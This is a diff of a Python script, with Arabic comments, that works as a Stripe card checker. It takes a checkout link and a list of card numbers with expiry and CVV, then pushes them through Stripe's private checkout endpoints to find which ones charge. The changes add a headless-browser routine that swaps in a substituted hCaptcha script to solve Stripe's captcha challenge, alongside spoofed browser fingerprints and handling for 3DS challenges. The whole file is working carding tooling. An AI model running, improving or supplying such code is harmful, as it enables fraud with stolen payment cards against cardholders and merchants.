@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import os, re, sys, json, time, uuid, hmac, base64, random, hashlib, asyncio, secrets, traceback
+import os, re, sys, json, time, uuid, hmac, base64, random, hashlib, asyncio, secrets
 import urllib.parse
 from urllib.parse import unquote, urlencode, urljoin, urlparse
 from datetime import datetime
@@ -13,6 +13,8 @@ except ImportError:
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 SJUA = "stripe.js/da394b0aef; stripe-js-v3/da394b0aef; checkout"
 STRIPE_VER = "2020-08-27"
+HCK = "c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a"
+NKEY = ""
 
 class C:
     R="\033[0m";B="\033[1m";RED="\033[91m";GRN="\033[92m";YEL="\033[93m"
@@ -91,6 +93,66 @@ def find_source_recursive(obj, depth=0, max_depth=12):
             if r: return r
     return None
 
+# --- دالة Playwright (خطة بديلة للكابتشا) ---
+async def _run_playwright_hcaptcha(checkout_url, rqdata=None, sitekey=None):
+    if not sitekey:
+        return None
+    hc_file_path = "hc_script.js"
+    hc_script_text = ""
+    if os.path.exists(hc_file_path):
+        with open(hc_file_path, "r") as f: hc_script_text = f.read()
+    else:
+        session = AsyncSession(impersonate="chrome", timeout=15)
+        try:
+            r = await session.get("https://js-hcaptcha-com.translate.goog/1/api.js?render=explicit&_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en")
+            if r.status_code == 200:
+                hc_script_text = r.text
+                with open(hc_file_path, "w") as f: f.write(hc_script_text)
+        except: pass
+        finally: await session.close()
+
+    if not hc_script_text: return None
+
+    node_script = """
+    const { chromium } = require('playwright');
+    const fs = require('fs');
+    const url = process.argv[2], sitekey = process.argv[3], rqdata = process.argv[4], hc_file = process.argv[5];
+    const hc_script = fs.readFileSync(hc_file, 'utf8');
+    (async () => {
+        try {
+            const browser = await chromium.launch({ executablePath: '/usr/bin/chromium-browser', headless: true, args: ['--no-sandbox', '--disable-dev-shm-usage'] });
+            const context = await browser.newContext({ bypassCSP: true });
+            const page = await context.newPage();
+            await page.route('**/*hcaptcha*', async (route) => {
+                if (route.request().url().includes('api.js')) await route.fulfill({ status: 200, contentType: 'application/javascript', body: hc_script });
+                else await route.continue();
+            });
+            await page.goto(url, { waitUntil: 'domcontentloaded' });
+            try { await page.waitForFunction(() => typeof hcaptcha !== 'undefined', { timeout: 5000 }); } catch(e) { console.log("FAIL"); return; }
+            const token = await page.evaluate(async ({sitekey, rqdata}) => {
+                if (typeof hcaptcha === 'undefined') return 'undefined_hcaptcha';
+                return new Promise((resolve) => {
+                    const holder = document.createElement('div'); document.body.appendChild(holder);
+                    const wid = hcaptcha.render(holder, { sitekey, size: 'invisible', rqdata, callback: resolve, 'error-callback': (e) => resolve('error_' + e) });
+                    hcaptcha.execute(wid, {rqdata});
+                });
+            }, {sitekey, rqdata});
+            console.log(token);
+            await browser.close();
+        } catch (e) { console.log('FAIL'); }
+    })();
+    """
+    node_file_path = "solver.js"
+    with open(node_file_path, "w") as f: f.write(node_script)
+
+    try:
+        process = await asyncio.create_subprocess_exec("node", node_file_path, checkout_url, sitekey, (rqdata or ""), hc_file_path, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        stdout, _ = await asyncio.wait_for(process.communicate(), timeout=20.0)
+        out = stdout.decode().strip()
+        if out and len(out) > 50 and not out.startswith("error_"): return out
+        return None
+    except Exception: return None
+
 class StripeSession:
     def __init__(self, url):
         self.url = url.strip()
@@ -125,13 +187,6 @@ class StripeSession:
         self.session = AsyncSession(impersonate="chrome", timeout=30)
         
         try:
-            tel = {"v":2,"tag":"5.6.8_js_fp","src":"checkout-inner-live-v3","a":{"a": self.pk, "b": f"https://checkout.stripe.com/c/pay/{self.cs}","c": 24, "d": "1920x1080", "e": False, "f": "en-US", "g": "Win32","h": UA, "i": -300, "j": False, "k": 8, "l": 8}}
-            r_tel = await self.session.post("https://m.stripe.com/6", json=tel, headers={"content-type":"application/json","origin":"https://js.stripe.com","referer":"https://js.stripe.com/","user-agent":UA})
-            if r_tel.status_code == 200:
-                j_tel = r_tel.json()
-                for k in ("muid","sid","guid"):
-                    if j_tel.get(k): self.tracking[k] = j_tel[k]
-
             body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
             r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init", headers=self._hdrs(), data=body)
             j = r.json()
@@ -165,11 +220,6 @@ class StripeSession:
             "time_on_page": str(random.randint(45000, 120000)),
             "guid": self.tracking["guid"], "muid": self.tracking["muid"], "sid": self.tracking["sid"], "key": self.pk,
         }
-        if self.cs and self.cs.startswith("cs_"):
-            data["client_attribution_metadata[client_session_id]"] = self.cs
-            data["client_attribution_metadata[merchant_integration_source]"] = "checkout"
-            data["client_attribution_metadata[merchant_integration_version]"] = "hosted_checkout"
-            data["client_attribution_metadata[payment_method_selection_flow]"] = "automatic"
         try:
             r = await self.session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=self._hdrs())
             j = r.json()
@@ -177,73 +227,6 @@ class StripeSession:
                 e = j["error"]; return None, (e.get("decline_code") or e.get("code") or "token_failed"), e.get("message", "")
             return j.get("id"), None, None
         except Exception as e: return None, "net", str(e)[:80]
-
-    async def _confirm_variants(self, pm_id):
-        total = self.raw_amount; checksum = self.init_json.get("init_checksum", ""); config_id = self.init_json.get("config_id", "")
-        common = {
-            "payment_method": pm_id, "expected_payment_method_type": "card",
-            "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}", "key": self.pk,
-            "client_attribution_metadata[client_session_id]": self.cs,
-            "client_attribution_metadata[merchant_integration_source]": "checkout",
-            "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
-            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
-            "muid": self.tracking["muid"], "sid": self.tracking["sid"], "guid": self.tracking["guid"],
-        }
-        if config_id: common["client_attribution_metadata[checkout_config_id]"] = config_id
-        if total > 0:
-            common["expected_amount"] = total
-            common["last_displayed_line_item_group_details[subtotal]"] = total
-            common["last_displayed_line_item_group_details[total_exclusive_tax]"] = 0
-            common["last_displayed_line_item_group_details[total_inclusive_tax]"] = 0
-            common["last_displayed_line_item_group_details[total_discount_amount]"] = 0
-            common["last_displayed_line_item_group_details[shipping_rate_amount]"] = 0
-        
-        variants = []
-        v = dict(common); v["eid"] = "NA"
-        if checksum: v["init_checksum"] = checksum
-        variants.append(("V1_NA_checksum", v))
-        v = dict(common); v["eid"] = "NA"; variants.append(("V2_NA_nochecksum", v))
-        v = dict(common); v["eid"] = str(uuid.uuid4())
-        if checksum: v["init_checksum"] = checksum
-        variants.append(("V3_UUID_checksum", v))
-        
-        last_err = None
-        for label, data in variants:
-            try:
-                r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs(), timeout=15)
-                j = r.json()
-                if "error" not in j: return j, label
-                msg = j["error"].get("message", "")
-                if "unknown parameter" in msg or "received unknown" in msg: last_err = j; continue
-                if "confirming the Checkout Session" not in msg: return j, label
-                last_err = j
-            except Exception as e: last_err = {"error": {"message": str(e)[:80]}}
-        return last_err or {"error": {"message": "all failed"}}, "ALL_FAILED"
-
-    async def _handle_waf(self, conf, pi):
-        na = pi.get("next_action") or conf.get("next_action") or {}
-        use_sdk = na.get("use_stripe_sdk") or {}
-        sjs = use_sdk.get("stripe_js") or {}
-        pi_id = pi.get("id")
-        cs_secret = pi.get("client_secret")
-        
-        if pi_id and cs_secret:
-            log("WAF Detected. Attempting Direct Bypass...", C.GOLD)
-            endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
-            try:
-                r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/verify_challenge", data={"key": self.pk, "client_secret": cs_secret}, headers=self._hdrs(), timeout=15)
-                res = r.json()
-                vpi = res.get("payment_intent") or res.get("setup_intent") or res
-                st = vpi.get("status", "") if isinstance(vpi, dict) else ""
-                
-                if st in ("succeeded", "requires_capture", "complete"):
-                    return {"success": True, "status": "CHARGED", "message": "Bypass hCaptcha OK", "raw": res}
-                
-                return {"success": False, "status": st.upper() if st else "REQUIRES_ACTION", "message": "Challenge bypassed, needs 3DS", "raw": res}
-            except Exception as e:
-                log(f"WAF bypass error: {e}", C.RED)
-
-        return {"success": False, "status": "WAF_FAILED", "message": "Could not bypass WAF"}
 
     async def _handle_3ds(self, conf, card):
         pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
@@ -294,8 +277,9 @@ class StripeSession:
                     comp_body = {"key": self.pk, "source": src, "cres": cres_b64, "challenge_window_size": "05"}
                     cr = await self.session.post("https://api.stripe.com/v1/3ds2/challenge_complete", data=urlencode(comp_body), headers=hdr, timeout=12)
                     if cr.json().get("status") == "succeeded":
-                         return {"success": True, "status": "CHARGED", "message": "3DS Forged OK", "raw": cr.json()}
-            except Exception: pass
+                         return {"success": True, "status": "CHARGED", "message": "3DS Challenge OK", "raw": cr.json()}
+            except Exception as e:
+                log(f"3DS Auth Err: {e}", C.RED)
                 
         return {"success": False, "status": "REQUIRES_ACTION", "message": "3DS Challenge/OTP Required"}
 
@@ -308,49 +292,57 @@ class StripeSession:
                 res["status"] = "DECLINED"; res["message"] = f"{(code or '').upper()}: {msg}".strip(": ")
                 res["response_time"] = time.time() - t0; return res
             
-            conf, variant = await self._confirm_variants(pm_id)
-            res["variant"] = variant
+            total = self.raw_amount; checksum = self.init_json.get("init_checksum", "")
+            
+            # الـ Payload الخاص بالراجل
+            data = {
+                "payment_method": pm_id, "expected_payment_method_type": "card",
+                "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}", "key": self.pk,
+                "eid": "NA",
+                "client_attribution_metadata[client_session_id]": self.cs,
+                "client_attribution_metadata[merchant_integration_source]": "checkout",
+                "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
+            }
+            if checksum: data["init_checksum"] = checksum
+            if total > 0: data["expected_amount"] = total
+                
+            r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs())
+            j = r.json()
             res["response_time"] = time.time() - t0
             
-            err = conf.get("error") or {}
-            if err:
-                code = err.get("decline_code") or err.get("code") or ""
-                msg = err.get("message", "")
-                if code in ("resource_missing","checkout_session_expired"):
-                    res["status"] = "SESSION_EXPIRED"; res["message"] = f"{code}: {msg}"; return res
-                res["status"] = "DECLINED"; res["message"] = f"{code.upper()}: {msg}".strip(": "); return res
-            
-            pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
-            st = pi.get("status") or conf.get("status") or ""
-            if st in ("succeeded","requires_capture","complete") or conf.get("payment_status") == "paid":
-                res["status"] = "CHARGED"; res["message"] = "Success"; res["success"] = True; return res
-            
-            if st == "requires_action":
-                na = pi.get("next_action") or {}
-                use_sdk = na.get("use_stripe_sdk") or {}
-                sdk_type = (use_sdk.get("type") or na.get("type") or "").lower()
-                sjs = use_sdk.get("stripe_js") or {}
-                is_waf = ("intent_confirmation_challenge" in sdk_type or "captcha" in sdk_type or bool(sjs.get("rqdata")))
+            if "error" in j:
+                err = j["error"]
+                # لو Stripe طلب كابتشا، هنا بنستخدم الكود بتاعنا
+                if "intent_confirmation_challenge" in str(err).lower():
+                    log("WAF Detected! Calling Playwright...", C.GOLD)
+                    site_key = self.init_json.get("passive_captcha", {}).get("site_key", HCK)
+                    rqdata = err.get("next_action", {}).get("use_stripe_sdk", {}).get("stripe_js", {}).get("rqdata")
+                    token = await _run_playwright_hcaptcha(self.url, rqdata, site_key)
+                    if token:
+                        v_body = {"key": self.pk, "client_secret": err.get("payment_intent", {}).get("client_secret", ""), "captcha_response": token}
+                        v_r = await self.session.post(f"https://api.stripe.com/v1/payment_intents/{err.get('payment_intent', {}).get('id')}/verify_challenge", data=v_body, headers=self._hdrs())
+                        j = v_r.json()
+                        if "error" not in j:
+                            return await self.charge(card) # إعادة المحاولة بعد الكابتشا
                 
-                if is_waf:
-                    log("WAF detected, applying bypass idea...", C.GOLD)
-                    waf = await self._handle_waf(conf, pi)
-                    if waf.get("success"):
-                        res["status"] = "CHARGED"; res["message"] = "Bypass hCaptcha OK"; res["success"] = True
-                        return res
-                    elif waf.get("status") == "REQUIRES_ACTION":
-                        log("WAF bypassed, now handling 3DS...", C.CYN)
-                        three = await self._handle_3ds(conf, card)
-                        res["status"] = three["status"]; res["message"] = three["message"]; res["success"] = three.get("success", False)
-                        return res
-                
-                three = await self._handle_3ds(conf, card)
-                res["status"] = three["status"]; res["message"] = three["message"]; res["success"] = three.get("success", False)
+                res["status"] = "DECLINED"
+                res["message"] = f"{err.get('code', '').upper()}: {err.get('message', '')}"
                 return res
-            res["status"] = st.upper() if st else "UNKNOWN"
+                
+            pi = j.get("payment_intent") or j.get("setup_intent") or j
+            st = pi.get("status") or j.get("status") or ""
+            
+            if st in ("succeeded", "requires_capture", "complete") or j.get("payment_status") == "paid":
+                res["status"] = "CHARGED"; res["message"] = "Success (Live)"; res["success"] = True
+            elif st == "requires_action":
+                three = await self._handle_3ds(j, card)
+                res["status"] = three["status"]; res["message"] = three["message"]; res["success"] = three.get("success", False)
+            else:
+                res["status"] = st.upper() if st else "UNKNOWN"
+                res["message"] = f"Status: {st}"
             return res
         except Exception as e:
-            res["message"] = f"{type(e).__name__}: {str(e)[:60]}"; res["response_time"] = time.time() - t0; return res
+            res["message"] = f"Exception: {str(e)[:60]}"; res["response_time"] = time.time() - t0; return res
 
     async def close(self):
         if self.session: await self.session.close()
@@ -369,3 +361,58 @@ def parse_card(line):
     cvv = re.sub(r'\D', '', p[3])
     if len(cvv) not in (3, 4): return None
     return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
+
+async def main():
+    print(f"{C.CYN}{C.B}═══ Stripe Direct API Fast Checker + 3DS ═══{C.R}\n")
+    url = input(f"{C.GOLD}▸ أدخل رابط Stripe Checkout: {C.R}").strip()
+    if not url.startswith("http"):
+        print(f"{C.RED}❌ رابط غير صالح.{C.R}")
+        return
+
+    print(f"\n{C.GOLD}▸ أدخل البطاقات (CC|MM|YY|CVV). لما تخلص اكتب 'done':{C.R}")
+    cards_input = []
+    while True:
+        line = input("  > ").strip()
+        if line.lower() == 'done': break
+        if line: cards_input.append(line)
+            
+    cards = [parse_card(c) for c in cards_input]
+    cards = [c for c in cards if c]
+    
+    if not cards:
+        print(f"{C.RED}❌ مفيش بطاقات صالحة.{C.R}")
+        return
+        
+    print(f"\n{C.LIME}🚀 بدء الفحص السريع لـ {len(cards)} بطاقة...{C.R}\n")
+    
+    for i, card in enumerate(cards, 1):
+        print(f"{C.CYN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.R}")
+        print(f"{C.YEL}⏳ بطاقة [{i}/{len(cards)}]: {card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}{C.R}")
+        
+        sess = StripeSession(url)
+        ok, err = await sess.prefetch()
+        if not ok:
+            print(f"{C.RED}❌ فشل جلب الجلسة: {err}{C.R}\n")
+            await sess.close()
+            continue
+            
+        print(f"🛒 المتجر: {sess.merchant} | المبلغ: {sess.amount_str}")
+        
+        res = await sess.charge(card)
+        await sess.close()
+        
+        color = C.LIME if res['status'] in ('CHARGED', 'LIVE') else C.RED
+        icon = "✅" if res['success'] else "❌"
+        
+        print(f"{color}{icon} النتيجة: {res['status']}{C.R}")
+        print(f"▸ الرسالة: {res['message']}")
+        print(f"▸ الوقت: {res['response_time']:.1f}s\n")
+        
+        await asyncio.sleep(0.5)
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print(f"\n{C.RED}تم الإيقاف.{C.R}")
+        sys.exit(0)
